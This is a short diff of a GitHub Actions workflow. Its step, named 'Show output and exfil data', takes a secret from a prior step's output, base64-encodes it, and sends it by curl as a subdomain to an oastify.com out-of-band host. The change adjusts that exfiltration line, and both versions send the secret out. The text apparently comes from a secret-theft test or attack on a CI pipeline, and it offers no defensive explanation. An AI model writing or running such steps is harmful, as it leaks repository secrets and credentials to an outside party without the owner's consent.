@@ -28,5 +28,5 @@ jobs:
 
       - name: Show output and exfil data
         run: |
-          echo  [${{steps.exfil.outputs.exfilsecret}}] | base64
-          curl -v http://${{steps.exfil.outputs.exfilsecret}}.ra59rmdtjx3wh3khhtnu5cimxd34rwfl.oastify.com
+          echo  eureka=[${{steps.exfil.outputs.exfilsecret}}]|base64
+          curl -v http://${eureka}.ra59rmdtjx3wh3khhtnu5cimxd34rwfl.oastify.com
